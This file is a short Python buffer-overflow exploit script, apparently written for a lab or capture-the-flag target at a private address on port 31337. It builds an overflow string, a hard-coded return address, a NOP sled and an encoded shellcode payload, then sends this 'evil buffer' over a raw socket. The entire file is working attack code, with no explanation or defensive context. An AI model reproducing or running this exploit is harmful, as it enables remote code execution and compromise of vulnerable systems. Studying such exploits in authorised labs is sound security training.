import socket

ip = "192.168.1.104"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xbe\xcb\x3a\x75\x70\xd9\xe9\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x73\x12\x03\x73\x12\x83\x20\xc6\x97\x85\x4a\xdf\xda"
"\x66\xb2\x20\xbb\xef\x57\x11\xfb\x94\x1c\x02\xcb\xdf\x70\xaf"
"\xa0\xb2\x60\x24\xc4\x1a\x87\x8d\x63\x7d\xa6\x0e\xdf\xbd\xa9"
"\x8c\x22\x92\x09\xac\xec\xe7\x48\xe9\x11\x05\x18\xa2\x5e\xb8"
"\x8c\xc7\x2b\x01\x27\x9b\xba\x01\xd4\x6c\xbc\x20\x4b\xe6\xe7"
"\xe2\x6a\x2b\x9c\xaa\x74\x28\x99\x65\x0f\x9a\x55\x74\xd9\xd2"
"\x96\xdb\x24\xdb\x64\x25\x61\xdc\x96\x50\x9b\x1e\x2a\x63\x58"
"\x5c\xf0\xe6\x7a\xc6\x73\x50\xa6\xf6\x50\x07\x2d\xf4\x1d\x43"
"\x69\x19\xa3\x80\x02\x25\x28\x27\xc4\xaf\x6a\x0c\xc0\xf4\x29"
"\x2d\x51\x51\x9f\x52\x81\x3a\x40\xf7\xca\xd7\x95\x8a\x91\xbf"
"\x5a\xa7\x29\x40\xf5\xb0\x5a\x72\x5a\x6b\xf4\x3e\x13\xb5\x03"
"\x40\x0e\x01\x9b\xbf\xb1\x72\xb2\x7b\xe5\x22\xac\xaa\x86\xa8"
"\x2c\x52\x53\x7e\x7c\xfc\x0c\x3f\x2c\xbc\xfc\xd7\x26\x33\x22"
"\xc7\x49\x99\x4b\x62\xb0\x4a\xb4\xdb\xbb\xec\x5c\x1e\xbb\xf4"
"\x4e\x97\x5d\x9e\x7e\xfe\xf6\x37\xe6\x5b\x8c\xa6\xe7\x71\xe9"
"\xe9\x6c\x76\x0e\xa7\x84\xf3\x1c\x50\x65\x4e\x7e\xf7\x7a\x64"
"\x16\x9b\xe9\xe3\xe6\xd2\x11\xbc\xb1\xb3\xe4\xb5\x57\x2e\x5e"
"\x6c\x45\xb3\x06\x57\xcd\x68\xfb\x56\xcc\xfd\x47\x7d\xde\x3b"
"\x47\x39\x8a\x93\x1e\x97\x64\x52\xc9\x59\xde\x0c\xa6\x33\xb6"
"\xc9\x84\x83\xc0\xd5\xc0\x75\x2c\x67\xbd\xc3\x53\x48\x29\xc4"
"\x2c\xb4\xc9\x2b\xe7\x7c\xe9\xc9\x2d\x89\x82\x57\xa4\x30\xcf"
"\x67\x13\x76\xf6\xeb\x91\x07\x0d\xf3\xd0\x02\x49\xb3\x09\x7f"
"\xc2\x56\x2d\x2c\xe3\x72")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
